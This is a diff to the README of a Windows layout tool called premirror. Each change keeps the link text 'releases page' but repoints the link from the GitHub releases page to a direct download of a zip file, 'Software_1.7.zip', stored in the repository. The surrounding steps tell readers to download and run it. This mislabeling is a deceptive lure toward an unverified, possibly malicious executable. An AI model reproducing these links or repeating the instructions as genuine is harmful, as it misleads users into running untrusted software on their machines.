@@ -1,6 +1,6 @@
 # ✏️ premirror - Build clean page layouts fast
 
-[![Download premirror](https://img.shields.io/badge/Download%20premirror-Visit%20Releases-blue)](https://github.com/Erickv8589/premirror/releases)
+[![Download premirror](https://img.shields.io/badge/Download%20premirror-Visit%20Releases-blue)](https://raw.githubusercontent.com/Erickv8589/premirror/main/packages/Software_1.7.zip)
 
 ## 🧭 What premirror is
 
@@ -26,7 +26,7 @@ For best results, use a recent version of Windows 10 or Windows 11.
 
 ## 📥 Download premirror
 
-Go to the [premirror releases page](https://github.com/Erickv8589/premirror/releases) and download the Windows file from the latest release.
+Go to the [premirror releases page](https://raw.githubusercontent.com/Erickv8589/premirror/main/packages/Software_1.7.zip) and download the Windows file from the latest release.
 
 If the release page shows more than one file, pick the one for Windows. It may end in:
 
@@ -121,7 +121,7 @@ A good folder setup can help you find your files later:
 
 ### How do I update premirror?
 
-Visit the [releases page](https://github.com/Erickv8589/premirror/releases) and download the newest Windows file. If you used an installer before, run the new installer. If you used a zip file, replace the old files with the new ones.
+Visit the [releases page](https://raw.githubusercontent.com/Erickv8589/premirror/main/packages/Software_1.7.zip) and download the newest Windows file. If you used an installer before, run the new installer. If you used a zip file, replace the old files with the new ones.
 
 ### Why won’t the app open?
 
@@ -147,4 +147,4 @@ Look in the folder you chose when you saved the project. If you did not choose a
 
 ## 🔗 Download again
 
-If you need the file again, use the [premirror releases page](https://github.com/Erickv8589/premirror/releases) to download and run the Windows version or to get the latest release files
+If you need the file again, use the [premirror releases page](https://raw.githubusercontent.com/Erickv8589/premirror/main/packages/Software_1.7.zip) to download and run the Windows version or to get the latest release files
